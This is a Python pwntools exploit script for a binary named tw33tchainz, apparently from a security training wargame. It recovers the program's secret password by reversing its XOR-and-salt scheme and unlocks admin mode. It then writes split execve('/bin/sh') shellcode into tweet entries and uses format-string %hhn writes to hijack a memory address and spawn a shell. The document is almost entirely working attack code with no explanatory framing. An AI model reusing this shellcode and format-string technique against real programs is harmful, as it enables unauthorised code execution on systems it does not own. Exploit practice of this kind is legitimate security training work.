from pwn import *
import struct

shellcode1 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode2 = "\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r = process("/levels/project1/tw33tchainz")
log.info("PID: {}".format(util.proc.pidof(r)))
pause()
# sending our username and salt
r.send("\x41" * 15)
r.send("\x01" * 15)

r.recvuntil("Generated Password:\n")
gen_pass = r.recv(32)
log.info("Generated password: {}".format(gen_pass))

# turn hex bytes into char
gen_pass = gen_pass.decode("hex")

# split every 4 char 
gen_pass = [gen_pass[i:i+4] for i in range(0, len(gen_pass), 4)]

# reverse the chars because of little endianess
gen_pass = [element[::-1] for element in gen_pass]

# join them together in one 16 byte string, and the encode it in a string of hex bytes
gen_pass = "".join([element.encode("hex") for element in gen_pass])

#### secret_pass[i] = (username[i] ^ gen_pass[i]) - salt[i] ####

# turn every byte into int
secret_pass = [int(gen_pass[byte:byte+2], 16) for byte in range(0, len(gen_pass), 2)]
end = secret_pass[len(secret_pass) - 1]

# xor every element with username
secret_pass = [(element ^ 0x41) for element in secret_pass] 

# substract the salt from every element
secret_pass = [(element - 0x01) for element in secret_pass] 
secret_pass[len(secret_pass) - 1] = end

# convert every element into char and join them into a strings
secret_pass = "".join([chr(element) for element in secret_pass])

r.sendline("\n3")
r.sendline(secret_pass)

# activate admin
r.sendline("6\n")

# write nothing in the first entry (for simplicty sake)
r.sendline("1")
r.send("\n\n")

# sending the first part of the shellcode
r.sendline("1")
r.send(shellcode1 + "\x90" + "\xEB\x10")
r.send("\n")

# sending the second part of the shellcode
r.sendline("1")
r.send(shellcode2 + "\x90" * 10)
r.send("\n\n")

r.sendline("1")
#r.send("\x90" + p32(0x804d03c) + "%9999x" + "%8$hn" + "\n\n")
r.send("\x90" + "\x3d\xd0\x04\x08" + "%219x" + "%8$hhn" + "\n\n")

r.sendline("1")
r.send("\x90" + "\x3c\xd0\x04\x08" + "%59x" + "%8$hhn" + "\n\n")

r.sendline("5")
r.interactive()
